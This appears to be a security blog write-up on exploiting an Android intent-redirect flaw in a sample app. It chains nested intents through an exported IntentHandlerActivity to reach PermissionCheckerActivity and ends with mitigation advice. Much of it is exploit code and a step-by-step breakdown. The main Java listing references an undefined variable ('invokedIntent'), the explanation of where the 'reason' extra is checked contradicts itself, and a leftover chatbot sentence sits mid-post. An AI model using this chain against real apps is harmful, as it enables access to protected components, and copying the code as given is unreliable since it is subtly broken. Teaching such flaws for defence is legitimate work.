---
layout: post
title: 'Intent Redirect: Unlocking Unexported Activity in Android Applications'
date: 2025-03-14 20:36 +0200
categories: Mobile
tags: Android Mobile
---

When building secure Android applications, handling intents safely is paramount. Intents facilitate communication between components but can also expose vulnerabilities when improperly implemented. In this writeup, we’ll explore how to exploit a chain of intents to uncover hidden functionality in the `IntentHandlerActivity` and `PermissionCheckerActivity` of a sample app.

## Overview of the Vulnerable Activities
### IntentHandlerActivity
The `IntentHandlerActivity` code introduces an intent attack surface by processing nested intents:
![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jIO7J-9KyzS54GlgDgb_qQ.png)

Key observations:
- **Nested Intents:** `IntentHandlerActivity` checks for an intent with the extra key "`android.intent.extra.INTENT`".
- **Conditions**: For the nested intent to be processed,
it must Have `return == 42` and also include another intent (`nextIntent`) with a reason `extra`.
- **Action**: If `reason == "next"`, `nextIntent` is launched.

### PermissionCheckerActivity
`PermissionCheckerActivity` responds to specific flags and permissions:
![](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*721C45T034CBPm6v3eLGrQ.png)
This means `PermissionCheckerActivity` requires: The `FLAG_GRANT_READ_URI_PERMISSION` flag.

## The Attack Strategy
The goal is to exploit `IntentHandlerActivity` to invoke `PermissionCheckerActivity` indirectly. Since `IntentHandlerActivity` validates and launches `nextIntent`, we can craft a malicious chain of intents to meet the conditions of both activities.

## Crafting the Exploit
Below is the Java code for an activity (`MainActivity`) that constructs and launches the required intent chain:
```java
package com.example.intenttest;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.widget.Button;

import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        ((Button) findViewById(R.id.btn_launch_activity)).setOnClickListener(v -> {
            Intent invokerIntent = new Intent();
            invokerIntent.setComponent(new ComponentName(
                    "com.attacksurface",
                    "com.attacksurface.activities.IntentHandlerActivity"
            ));

            Intent targetIntent = new Intent();
            targetIntent.setComponent(new ComponentName(
                    "com.attacksurface",
                    "com.attacksurface.activities.PermissionCheckerActivity"
            ));

            targetIntent.putExtra("reason", "next");
            targetIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);

            Intent innerIntent = new Intent();
            innerIntent.putExtra("return", 42);
            innerIntent.putExtra("nextIntent", invokedIntent);

            invokerIntent.putExtra("android.intent.extra.INTENT", innerIntent);

            startActivity(invokerIntent);
        });
    }
}
```
## Exploit Breakdown
The following is a detailed breakdown of the exploit designed to target the `IntentHandlerActivity` and indirectly invoke the `PermissionCheckerActivity`:
### 1. Outer Intent (invokerIntent)
**Purpose:**
This is the outermost intent that targets the vulnerable `IntentHandlerActivity`.

**Key Properties:**

- **Target Component:** `com.attacksurface.activities.IntentHandlerActivity`
- **Payload**:
It contains an extra with the key `android.intent.extra.INTENT`, which carries a nested intent (**innerIntent**).
```java
Intent invokerIntent = new Intent();
invokerIntent.setComponent(new ComponentName(
        "com.attacksurface",
        "com.attacksurface.activities.IntentHandlerActivity"
));
```

### 2. Inner Intent (innerIntent)
**Purpose:**
This nested intent is validated by IntentHandlerActivity and holds the key to triggering the target activity.

**Key Properties:**

- **Validation Parameter:**
The return extra is set to 42, which satisfies a condition in IntentHandlerActivity.
- **Payload:**
It contains another nested intent (nextIntent) that will eventually be passed to PermissionCheckerActivity.
```java
Intent innerIntent = new Intent();
innerIntent.putExtra("return", 42);
innerIntent.putExtra("nextIntent", targetIntent);
```

### 3. Target Intent (targetIntent)
**Purpose:**
This intent is the core target, which will be passed and triggered in PermissionCheckerActivity via the exploit.

**Key Properties:**

- **Target Component:**
`com.attacksurface.activities.PermissionCheckerActivity`
- **Validation Parameters:**
`reason`: Set to "`next`", which satisfies a condition in `IntentHandlerActivity`.
`FLAG_GRANT_READ_URI_PERMISSION`: This flag is essential to pass the permission check in `PermissionCheckerActivity`.
```java
Intent targetIntent = new Intent();
targetIntent.setComponent(new ComponentName(
        "com.attacksurface",
        "com.attacksurface.activities.PermissionCheckerActivity"
));
targetIntent.putExtra("reason", "next");
targetIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
```

### 4. Linking Intents
**Process:**
The intents are chained together in a specific order:

- The `targetIntent` is embedded within `innerIntent` as the value for the key `nextIntent`.
- The `innerIntent` is embedded within `invokerIntent` as the value for the key `android.intent.extra.INTENT`.
**Outcome:**
When `invokerIntent` is launched, it triggers a chain of intent calls that bypasses restrictions, eventually leading to the launch of `PermissionCheckerActivity`.
```java
invokerIntent.putExtra("android.intent.extra.INTENT", innerIntent);
```

### 5. Triggering the Exploit
**Execution:**
The exploit is triggered when the button in the MainActivity UI is clicked, calling startActivity(invokerIntent) to start the chain of intents.
```java
((Button) findViewById(R.id.btn_launch_activity)).setOnClickListener(v -> {
    startActivity(invokerIntent);
});
```

## Exploit Flow Summary
- **MainActivity**: Constructs and launches `invokerIntent`.
- **IntentHandlerActivity**: Processes `invokerIntent` and validates `innerIntent`.
- **PermissionCheckerActivity**: Executes `targetIntent`, completing the flow and performing its functionality.

By chaining these intents together, the exploit bypasses security restrictions and successfully invokes `PermissionCheckerActivity`.

Let me know if you’d like further refinement or more detailed explanations!

## Mitigation Strategies
To prevent such vulnerabilities, developers should:

1. **Restrict Component Exposure:**
Mark sensitive activities as `android:exported="false"` unless explicitly needed.
2. **Validate Incoming Intents:**
Check the source of intents using `getCallingPackage()` or `PendingIntent`.
3. **Avoid Processing Nested Intents:**
Minimize or eliminate the use of nested intents unless absolutely necessary.
4. **Enforce Permissions:**
Require explicit permissions for sensitive activities.

## Conclusion
This writeup demonstrates how improper intent handling can expose vulnerabilities in Android applications. By crafting a malicious chain of intents, we successfully exploited the `IntentHandlerActivity` and `PermissionCheckerActivity`. This highlights the importance of secure coding practices to protect applications from intent-based attacks.

**THANKS FOR READING ❤️**
